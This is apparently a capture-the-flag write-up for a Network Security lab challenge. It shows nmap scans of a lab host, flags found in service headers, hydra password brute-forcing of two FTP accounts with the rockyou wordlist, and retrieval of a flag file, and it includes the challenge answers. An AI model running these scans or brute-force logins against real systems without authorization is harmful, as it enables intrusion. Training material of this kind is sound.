Practice the skills you have learned in the Network Security module.

### introduction
Use this challenge to test your mastery of the skills you have acquired in the Network Security module. All the questions in this challenge can be solved using only `nmap`, `telnet`, and `hydra`.

What is the highest port number being open less than 10,000?

```
⚡dd0x ❯❯ sudo nmap -sS -vv -sV -p1-10000 10.10.26.156
[sudo] password for dd0x: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-27 19:22 PST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 19:22
Scanning 10.10.26.156 [4 ports]
Completed Ping Scan at 19:22, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:22
Completed Parallel DNS resolution of 1 host. at 19:22, 0.06s elapsed
Initiating SYN Stealth Scan at 19:22
Scanning 10.10.26.156 [10000 ports]
Discovered open port 22/tcp on 10.10.26.156
Discovered open port 445/tcp on 10.10.26.156
Discovered open port 8080/tcp on 10.10.26.156
Discovered open port 139/tcp on 10.10.26.156
Discovered open port 80/tcp on 10.10.26.156
```

`8080`

There is an open port outside the common 1000 ports; it is above 10,000. What is it?  

`nmap -sS -sV -T4 -p- 10.10.26.156`
```
PORT       STATE SERVICE       REASON           VERSION
22/tcp     open  ssh           syn-ack ttl 63   protocol 2.0
80/tcp     open  http          syn-ack ttl 63   lighttpd
139/tcp    open  netbios-ssn   syn-ack ttl 63   Samba smbd 4.6.2
445/tcp    open  netbios-ssn   syn-ack ttl 63   Samba smbd 4.6.2
8080/tcp   open  http          syn-ack ttl 63   Node.js (Express middleware)
10021/tcp  open  ftp           syn-ack ttl 63   vsftpd 3.0.3

```

`10021`

How many TCP ports are open?  

```
PORT       STATE SERVICE       REASON           VERSION
22/tcp     open  ssh           syn-ack ttl 63   protocol 2.0
80/tcp     open  http          syn-ack ttl 63   lighttpd
139/tcp    open  netbios-ssn   syn-ack ttl 63   Samba smbd 4.6.2
445/tcp    open  netbios-ssn   syn-ack ttl 63   Samba smbd 4.6.2
8080/tcp   open  http          syn-ack ttl 63   Node.js (Express middleware)
10021/tcp  open  ftp           syn-ack ttl 63   vsftpd 3.0.3

```

`6`

What is the flag hidden in the HTTP server header?

```
80/tcp   open  http        lighttpd
|_http-server-header: lighttpd THM{web_server_25352}
|_http-title: Hello, world!

```

`THM{web_server_25352}`

What is the flag hidden in the SSH server header?  

```
22/tcp   open  ssh         (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339
```

`THM{946219583339}`

We have an FTP server listening on a nonstandard port. What is the version of the FTP server?  

```
 ⚡dd0x ❯❯ ftp 10.10.26.156 10021
Connected to 10.10.26.156.
220 (vsFTPd 3.0.5)
Name (10.10.26.156:dd0x):
```

`vsFTPd 3.0.5`

We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?  

payload for eddie
```
 ⚡dd0x ❯❯ hydra -l eddie -P ~/Downloads/rockyou.txt ftp://10.10.26.156:10021
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-27 19:29:46
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.26.156:10021/
[10021][ftp] host: 10.10.26.156   login: eddie   password: jordan
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-27 19:30:00

```

login eddie's account from the ftp 

```
 ⚡dd0x ❯❯ ftp 10.10.26.156 10021
Connected to 10.10.26.156.
220 (vsFTPd 3.0.5)
Name (10.10.26.156:dd0x): eddie
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> LIST
?Invalid command.
ftp> ls
229 Entering Extended Passive Mode (|||30313|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> 

```
Nothing was discovered in eddie's acc

payload for quinn
```
 ⚡dd0x ❯❯ hydra -l quinn -P ~/Downloads/rockyou.txt ftp://10.10.26.156:10021
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-27 19:29:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.26.156:10021/
[10021][ftp] host: 10.10.26.156   login: quinn   password: andrea
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-27 19:29:29
```

login quinn's account
```
 ⚡dd0x ❯❯ ftp 10.10.26.156 10021
Connected to 10.10.26.156.
220 (vsFTPd 3.0.5)
Name (10.10.26.156:dd0x): quinn
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30363|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
226 Directory send OK.
ftp> get ftp_flag.txt
local: ftp_flag.txt remote: ftp_flag.txt
229 Entering Extended Passive Mode (|||30839|)
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |***********************************|    18       17.99 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.06 KiB/s)
ftp> exit
221 Goodbye.

```

after getting the `ftp_flag.txt` lets check the file
`cat ftp_flag.txt`

`THM{321452667098}`

Browsing to `http://10.10.26.156:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?

![[Pasted image 20250427193916.png]]
use the command `-sN`

![[Pasted image 20250427194049.png]]
`THM{f7443f99}`